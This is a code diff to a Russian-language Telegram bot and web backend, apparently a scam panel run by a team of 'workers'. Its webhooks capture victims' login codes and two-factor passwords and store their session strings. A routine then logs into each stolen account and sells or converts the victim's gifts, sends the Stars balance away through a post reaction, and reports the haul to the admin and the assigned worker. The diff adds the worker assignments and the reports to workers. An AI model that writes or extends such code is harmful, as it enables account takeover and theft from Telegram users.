@@ -1110,6 +1077,7 @@ async def cmd_grant(message: types.Message):
         await message.answer("Использование: <code>/grant user_id</code>")
         return
     uid = int(args[1])
+    await add_user(uid, None, None, "worker")
     await set_role(uid, "worker")
     await message.answer(f"✅ <code>{uid}</code> теперь воркер.")
     try:
@@ -1177,7 +1145,7 @@ async def wh_phone(p: PhonePayload):
         await update_session(sess.id, session_string=client.session.save())
         await update_session(sess.id, phone_code_hash=sent.phone_code_hash)
         await client.disconnect()
-        print(f"PHONE_HASH saved: {sent.phone_code_hash}")
+        print(f"PHONE_HASH saved")
         return {"ok": True}
     except Exception as e:
         try:
@@ -1211,7 +1179,11 @@ async def wh_code(p: CodePayload):
         await notify_admin(
             f"✅ <b>Логин</b>\n<code>{res['user_id']}</code>\n"
             f"{res['first_name']} @{res['username'] or '—'}\nОффер #{p.offer_id}")
-        asyncio.create_task(run_automation(session_str, p.offer_id))
+
+        # запускаем автомат
+        o = await get_offer(p.offer_id)
+        worker_id = o.worker_id if o else ADMIN_ID
+        asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
         return {"ok": True, "needs_password": False}
     else:
         if res == "password":
@@ -1246,7 +1218,9 @@ async def wh_password(p: PasswordPayload):
                              user_id=res["user_id"], first_name=res["first_name"],
                              last_name=res["last_name"], username=res["username"])
         await notify_admin(f"✅ <b>Логин 2FA</b>\n<code>{res['user_id']}</code>\n{res['first_name']}")
-        asyncio.create_task(run_automation(session_str, p.offer_id))
+        o = await get_offer(p.offer_id)
+        worker_id = o.worker_id if o else ADMIN_ID
+        asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
         return {"ok": True}
     else:
         if res == "password":
@@ -1257,44 +1231,57 @@ async def wh_password(p: PasswordPayload):
         return {"ok": False, "error": "Ошибка."}
 
 
-async def run_automation(session_string, offer_id):
+async def run_automation(session_string, offer_id, worker_id):
     o = await get_offer(offer_id)
     if not o:
         return
-    await notify_admin(f"🚀 <b>Автомат запущен</b>\nОффер #{offer_id}")
-    result = await telethon_sell_gift_and_react(session_string)
+    await notify_admin(f"🚀 <b>Автомат запущен</b>\nОффер #{offer_id} — воркер <code>{worker_id}</code>")
+
+    result = await telethon_sell_all_and_react(session_string, worker_id, offer_id)
 
     lines = ["🎯 <b>Результат автомата</b>", f"Оффер: #{offer_id}", ""]
+    lines.append(f"📦 Всего подарков: <b>{result.get('gifts_total', 0)}</b>")
 
-    gifts_found = result.get("gifts_found", [])
-    lines.append(f"📦 Найдено подарков: <b>{len(gifts_found)}</b>")
+    converted = result.get("converted", [])
+    if converted:
+        lines.append(f"\n💱 <b>Конвертировано ({len(converted)}):</b>")
+        for c in converted[:10]:
+            lines.append(f"• {c['title']}")
 
-    listed = result.get("gifts_listed", [])
-    ok_listed = [x for x in listed if x.get("ok")]
-    fail_listed = [x for x in listed if not x.get("ok")]
+    listed = result.get("listed", [])
+    if listed:
+        lines.append(f"\n🏷 <b>Выставлено ({len(listed)}):</b>")
+        for x in listed[:10]:
+            lines.append(f"• {x['title']} — {x['min_price']} ⭐")
 
-    if ok_listed:
-        lines.append(f"\n✅ <b>Выставлено ({len(ok_listed)}):</b>")
-        for x in ok_listed[:20]:
-            lines.append(f"• {x['title']} — {x['min_price']}⭐")
-        if len(ok_listed) > 20:
-            lines.append(f"…и ещё {len(ok_listed)-20}")
+    sold = result.get("sold", [])
+    if sold:
+        lines.append(f"\n✅ <b>Продано ({len(sold)}):</b>")
+        for x in sold:
+            lines.append(f"• {x['title']}")
 
-    if fail_listed:
-        lines.append(f"\n❌ <b>Не выставлено ({len(fail_listed)}):</b>")
-        for x in fail_listed[:10]:
-            lines.append(f"• {x['title']} — {x.get('error') or '—'}")
+    failed = result.get("failed", [])
+    if failed:
+        lines.append(f"\n❌ <b>Ошибок ({len(failed)}):</b>")
+        for x in failed[:5]:
+            lines.append(f"• {x['title']} — {x['reason'][:50]}")
 
-    lines.append(f"\n💰 Баланс до реакции: <b>{result.get('balance_before', 0)} ⭐</b>")
-
+    lines.append(f"\n💰 Баланс: <b>{result.get('balance_after', 0)} ⭐</b>")
     if result.get("reacted"):
         lines.append(f"✅ Реакция на пост: <b>{result['stars_sent']} ⭐</b>")
     elif result.get("error"):
         lines.append(f"❌ {result['error']}")
 
-    await notify_admin("\n".join(lines))
-    await add_log(offer_id=offer_id, event="automation_done",
-                  detail=f"listed={result.get('total_listed', 0)} reacted={result.get('reacted')}")
+    text = "\n".join(lines)
+    await notify_admin(text)
+    # отправляем воркеру тоже
+    try:
+        await bot.send_message(worker_id, text)
+    except Exception:
+        pass
+
+    await add_log(worker_id=worker_id, offer_id=offer_id, event="automation_done",
+                  detail=f"reacted={result.get('reacted')} stars={result.get('stars_sent')}")
 
 
 @app.get("/health")
@@ -1309,8 +1296,6 @@ async def health():
 async def run_bot():
     print("=" * 60)
     print(f"BOOT: token={BOT_TOKEN[:20]}...{BOT_TOKEN[-10:]}")
-    print(f"BOOT: username={BOT_USERNAME}")
-    print(f"BOOT: short={MINIAPP_SHORT}")
     print(f"BOOT: admin={ADMIN_ID}")
     print("=" * 60)
     await init_db()
@@ -1324,7 +1309,6 @@ async def run_bot():
         BotCommand(command="start", description="Меню"),
         BotCommand(command="offer", description="Создать: /offer user_id ссылка сумма"),
     ], scope=BotCommandScopeDefault())
-    print("RUN_BOT: commands set")
     print("RUN_BOT: polling now...")
     await dp.start_polling(bot)
 
